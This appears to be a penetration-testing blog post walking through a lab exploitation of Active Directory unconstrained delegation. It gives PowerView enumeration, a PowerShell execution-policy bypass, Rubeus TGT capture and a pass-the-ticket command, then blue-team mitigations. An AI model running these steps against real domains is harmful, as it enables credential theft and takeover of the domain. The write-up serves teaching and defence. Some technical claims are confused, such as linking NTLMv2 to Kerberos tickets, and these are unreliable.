# 🛡️ Unconstrained Delegation in Active Directory  
### From a Penetration Testing Perspective

---

## 🔍 Introduction

In modern Active Directory (AD) environments, **Unconstrained Delegation** remains a commonly abused misconfiguration. It provides an easy path for privilege escalation and lateral movement, especially in internal penetration tests where attackers assume the breach scenario.

This blog documents a full scenario from a red team perspective, demonstrating how a compromised machine configured with unconstrained delegation can lead to Domain Admin compromise.

---

## 🤮 Lab Setup

- **Engagement Type:** Internal Active Directory Penetration Test  
- **Assessment Approach:** Assume Breach (Local Admin on host)  
- **Duration:** 2 Days  
- **Attacker Host:** `JOINEDDOMAIN2`

---

## 🔧 Step 1: Discover Unconstrained Delegation Machines

First, we import PowerView and PowerUp modules to enumerate AD objects:

```powershell
powershell -ep bypass
.\powerview.ps1
.\powerup.ps1
Get-DomainComputer -Unconstrained | Select-Object -ExpandProperty name
```

**Output:**

![Unconstrained Computers](sandbox:/mnt/data/19a35b0a-5a2a-4e14-81db-17a794d60ba7.png)

As seen, `JOINEDDOMAIN2` is among the systems configured with unconstrained delegation.

---

## 🌐 Step 2: Confirm NTLM Compatibility (for Kerberos Ticket Handling)

Ensure the target machine allows the usage of NTLMv2, which supports the Kerberos ticket handling used in our attack.

![NTLM Policy](sandbox:/mnt/data/7c470e2c-1710-40e5-9baa-ac25bc682616.png)

---

## ⌚ Step 3: Start TGT Monitoring with Rubeus

```powershell
.\Rubeus.exe monitor /interval:10 /filteruser:JOINEDDOMAIN2 /nowrap
```

Rubeus will monitor for incoming TGTs every 10 seconds.

![Rubeus Monitor Start](sandbox:/mnt/data/03326e15-4f59-44ca-92b3-c28df874e95c.png)

---

## 🚼 Step 4: Admin RDP Access (Victim Logs In)

Enable RDP on the victim machine (JOINEDDOMAIN2):

![Remote Desktop Enabled](sandbox:/mnt/data/ef7834e8-0733-42fb-8ac1-e3a42b1f3157.png)

Domain admin logs in via RDP:

![Domain Admin Login](sandbox:/mnt/data/b0940ad6-7d12-4fb6-834c-83c9bab34065.png)

Connection from domain controller using MARVEL\Administrator:

![RDP Connection to JOINEDDOMAIN2](sandbox:/mnt/data/6f1f91fb-402b-4015-8a7e-e79a5815d23f.png)

---

## 🕵️‍♂️ Step 5: TGT Captured by Rubeus

Once the Domain Admin logs in, Rubeus captures the TGT:

![Rubeus Captured Ticket](sandbox:/mnt/data/3136785b-0616-4c5e-9b87-2f4a4e176b53.png)

---

## 🚀 Step 6: Inject TGT and Assume Identity

Use the captured TGT to inject and impersonate the Domain Admin:

```powershell
.\Rubeus.exe ptt /ticket:BASE64TICKET==
```

Result:

![TGT Injected](sandbox:/mnt/data/287eb3a5-0040-44d1-8a66-7c02bfbbeff1.png)

---

## 🧐 Step 7: Explore Filesystem as Domain Admin

List contents of `Administrator` and `Pparker` profiles to demonstrate proof of access:

![Proof of Access](sandbox:/mnt/data/8ea07ade-79fb-4f2d-b2c5-354abd834491.png)

---

## 🚫 Mitigations for Blue Teams

- Audit delegation settings:
  ```powershell
  Get-ADComputer -Filter * -Properties TrustedForDelegation | Where-Object { $_.TrustedForDelegation -eq $true }
  ```
- Replace unconstrained delegation with **constrained** or **resource-based constrained delegation**.
- Restrict high-privilege accounts from logging into non-secure hosts.
- Monitor for tools like Rubeus using EDR solutions.

---

## 🚨 Conclusion

This scenario demonstrates how **Unconstrained Delegation**, although an old vulnerability, still leads to **Domain Admin compromise** in 2025 environments. It is a red team's low-effort, high-reward pathway when misconfigurations persist in internal networks.

**Lesson:** One RDP session to the wrong host can compromise your domain.

---

*Red Team Operator: Malek | Toolset: PowerView, PowerUp, Rubeus | Scenario: JOINEDDOMAIN2 Misconfiguration Exploitation*

